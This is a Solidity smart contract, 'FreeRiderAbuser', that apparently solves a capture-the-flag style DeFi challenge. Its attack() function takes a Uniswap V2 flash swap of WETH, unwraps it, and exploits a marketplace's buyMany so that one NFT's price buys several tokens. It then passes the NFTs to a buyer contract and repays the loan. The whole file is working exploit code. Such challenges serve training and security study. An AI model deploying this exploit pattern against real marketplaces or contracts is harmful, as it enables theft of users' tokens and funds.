// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";
interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH9 {
    function withdraw(uint wad) external;
}

contract FreeRiderAbuser is ReentrancyGuard, IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    IERC20 immutable weth;

    address private caller;
    address private buyer;
    IERC721 private nft;
    IMarketplace private marketplace;
    uint256 private price;
    uint256[] private tokenIDs;
    constructor(address _weth) {
       weth = IERC20(_weth);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata /*data*/) external override
    {
        require (sender == address(this), "Only accepting swaps from ourselves");
        require (amount0 == price || amount1 == price, "One of the amounts must match the price");

        uint amount;
        if (amount0 > 0) {
            amount = amount0;
        } else {
            amount = amount1;
        }

        // Swap to ETH to be able to buy
        IWETH9(address(weth)).withdraw(amount);

        marketplace.buyMany{value:price}(tokenIDs);

        // Transfer the NFTs to the buyers contract
        for (uint i = 0; i < tokenIDs.length; i++) {
            nft.safeTransferFrom(address(this), buyer, tokenIDs[i]);
        }
        
        // Swap back to WETH
        payable(address(weth)).sendValue(price * 1000/997 + 1);

        // Pay off the loan
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }

    function attack(address _buyer, address _nft, address _marketplace, address _pair, uint256 _price, uint256[] calldata _tokenIDs) external payable
    {
        IUniswapV2Pair pair = IUniswapV2Pair(_pair);

        caller = msg.sender;
        buyer = _buyer;
        nft = IERC721(_nft);
        marketplace = IMarketplace(_marketplace);
        price = _price;
        tokenIDs = _tokenIDs;

        if (pair.token0() == address(weth)) {
            pair.swap(price, 0, address(this), new bytes(1));
        } else {
            pair.swap(0, price, address(this), new bytes(1));
        }
        
        delete marketplace;
        delete pair;
        delete price;
        delete tokenIDs;
    }

    receive() external payable {

    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));
        return IERC721Receiver.onERC721Received.selector;
    }
}